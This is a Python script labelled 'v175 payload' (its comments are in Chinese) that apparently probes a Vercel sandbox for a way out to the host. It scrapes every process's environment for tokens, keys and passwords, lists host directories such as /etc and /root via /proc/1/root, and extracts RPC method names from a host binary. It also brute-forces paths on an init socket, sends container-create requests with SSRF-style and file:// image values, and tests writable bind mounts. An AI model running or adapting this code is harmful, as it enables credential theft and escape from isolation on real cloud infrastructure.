# -*- coding: utf-8 -*-
"""v175 payload: 宿主环境/文件枚举 + ContainersService 方法列表 + init.sock connect 路径爆破
输出 /vercel/sandbox/v175c.out"""
import socket, struct, time, json, os, signal, re, subprocess

OUT = '/vercel/sandbox/v175c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(275)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def walk_tree(base, max_files=400, max_depth=5):
    """枚举目录树, 只记录名字+大小"""
    out = []
    try:
        for root, dirs, files in os.walk(base):
            depth = root[len(base):].count(os.sep)
            if depth > max_depth:
                dirs[:] = []
                continue
            try:
                dirs.sort()
            except Exception:
                pass
            for fn in sorted(files):
                try:
                    p = os.path.join(root, fn)
                    sz = os.path.getsize(p)
                    out.append('%s [%d]' % (p, sz))
                except Exception:
                    out.append(os.path.join(root, fn) + ' [?]')
                if len(out) >= max_files:
                    return out
            if len(out) >= max_files:
                return out
    except Exception as e:
        out.append('WALK EXC %s' % e)
    return out


# ============ 1: 宿主环境变量 ============
log('=== 1 host env ===')
# sandbox-init (pid 1) env
try:
    env = open('/proc/1/environ').read().replace('\x00', '\n')
    log('PID1 ENV:\n%s' % env[:3000])
except Exception as e:
    log('PID1 ENV EXC %s' % e)
# 所有宿主进程 cmdline + env 扫描 (找 token/密钥)
log('--- procs ---')
try:
    for d in sorted(os.listdir('/proc'), key=lambda x: int(x) if x.isdigit() else 0):
        if not d.isdigit():
            continue
        try:
            cmd = open('/proc/%s/cmdline' % d).read().replace('\x00', ' ')[:150]
            if not cmd:
                cmd = '[' + open('/proc/%s/comm' % d).read().strip() + ']'
        except Exception:
            continue
        try:
            e = open('/proc/%s/environ' % d).read()
            hits = [x for x in e.split('\x00') if re.search(r'(TOKEN|KEY|SECRET|PASS|AUTH|CRED)', x, re.I)][:6]
            hit_s = ' || '.join(hits)[:300] if hits else ''
        except Exception:
            hit_s = ''
        log('P %s: %s%s' % (d, cmd, (' ENV:' + hit_s) if hit_s else ''))
except Exception as e:
    log('PROCS EXC %s' % e)

# ============ 2: 宿主文件系统枚举 ============
log('=== 2 host fs ===')
for base in ['/opt/vercel', '/etc', '/root', '/home', '/var/run', '/srv']:
    try:
        p = R + base
        if not os.path.isdir(p):
            log('SKIP %s' % base)
            continue
        lst = walk_tree(p, max_files=120, max_depth=4)
        log('TREE %s (%d):\n%s' % (base, len(lst), '\n'.join(lst)[:3800]))
    except Exception as e:
        log('TREE %s EXC %s' % (base, e))

# ============ 3: ContainersService 方法列表 ============
log('=== 3 ctrs methods ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    for anchor in [b'containers.proto\x12\x1cvercel.hive.cell.api.containers.v1',
                   b'vercel.hive.cell.api.containers.v1ContainersService']:
        i = data.find(anchor)
        log('anchor %r at 0x%x' % (anchor[:20], i))
        if i > 0:
            seg = data[i:i + 4000]
            # 提取方法名
            names = re.findall(rb'[A-Z][A-Za-z0-9_]{2,30}(?:Request|Response)?', seg)
            uniq = []
            for n in names:
                s = n.decode(errors='replace')
                if s not in uniq:
                    uniq.append(s)
            log('METHODS: %s' % (', '.join(uniq[:60])))
            break
except Exception as e:
    log('CTRS EXC %s' % e)
# 从 Go 符号表找 handler 注册
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    pats = re.findall(rb'vercel\.hive\.cell\.api\.containers\.v1\.ContainersService/[A-Za-z]+', data)
    uniq = []
    for p in pats:
        s = p.decode(errors='replace')
        if s not in uniq:
            uniq.append(s)
    log('HANDLERS: %s' % ', '.join(uniq[:40]))
except Exception as e:
    log('HANDLERS EXC %s' % e)

# ============ 4: init.sock connect 路径爆破 ============
log('=== 4 init paths ===')
sp = R + '/volumes/run/vercel/share/init.sock'
srv = ['SandboxService', 'Sandbox', 'InitService', 'Init', 'CellService', 'Cell',
       'RuntimeService', 'Runtime', 'ProcessService', 'Process', 'GuestService', 'Guest',
       'LifecycleService', 'Lifecycle', 'StatusService', 'HealthService']
mth = ['Status', 'Get', 'Info', 'Health', 'Ping', 'Start', 'Stop', 'Restart', 'Version',
       'Inspect', 'Describe', 'List', 'Create', 'Delete', 'Ready', 'Alive', 'Stats', 'Events']
pkgs = ['vercel.sandbox.v1', 'vercel.init.v1', 'vercel.cell.v1', 'vercel.runtime.v1',
        'sandbox.v1', 'init.v1', 'cell.v1', 'vercel.v1', 'vercel.hive.sandbox.v1',
        'vercel.hive.init.v1', 'vercel.hive.cell.v1']
paths = set()
for pkg in pkgs:
    for s in srv:
        for m in mth:
            paths.add('/%s.%s/%s' % (pkg, s, m))
paths |= {'/', '/healthz', '/health', '/v1/health', '/status'}
cnt = 0
for p in sorted(paths):
    try:
        st, pay = raw_req(sp, p, b'{}', t=1.5)
        if '404' not in st and '400' not in st:
            log('INIT HIT %s -> %s %r' % (p, st, pay[:300]))
        cnt += 1
    except Exception:
        pass
log('init scan %d paths done' % cnt)

# ============ 5: Create image 参数测试 ============
log('=== 5 create img ===')
for img in ['busybox', 'docker.io/library/busybox:latest',
            'http://100.64.0.1:80/x', 'file:///etc/passwd',
            '977805900172.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller']:
    st, pay = raw_req(CELL, '%s/Create' % CTRS,
                      json.dumps({'drive_id': 'sandbox', 'command': 'yes', 'image': img}).encode(), t=6)
    log('Create img=%s -> %s %r' % (img[:60], st, pay[:200]))

# ============ 6: Mount destination 白名单试探 ============
log('=== 6 mount dst ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    time.sleep(0.5)
    dsts = ['/vercel/sandbox', '/vercel', '/run', '/tmp', '/mnt', '/home', '/root',
            '/vercel/sandbox/x', '/proc/x', '/dev/shm', '/var/tmp', '/opt']
    for dst in dsts:
        body = json.dumps({'container_id': cid, 'mount': {
            'type': 'MOUNT_TYPE_BIND', 'source': '/etc/hostname',
            'destination': dst, 'mode': 'MOUNT_MODE_READ_WRITE'}}).encode()
        st2, pay2 = raw_req(CELL, '%s/Mount' % CTRS, body, t=4)
        log('Mount dst=%s -> %s %r' % (dst, st2, pay2[:160]))

log('V175_DONE')
f.close()
